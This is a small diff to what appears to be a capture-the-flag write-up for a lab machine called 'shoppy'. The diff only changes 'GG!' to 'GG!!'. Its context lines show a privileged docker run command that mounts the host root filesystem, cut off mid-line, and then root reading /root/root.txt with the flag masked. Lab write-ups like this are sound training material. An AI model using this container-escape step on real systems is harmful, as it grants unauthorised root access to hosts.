@@ -248,4 +248,4 @@ deploy@shoppy:/tmp$ docker run --rm -it --pid=host --net=host --privileged -v /:
 root@shoppy:/# cat /root/root.txt
 c5a7****************************
 ```
-GG!
+GG!!
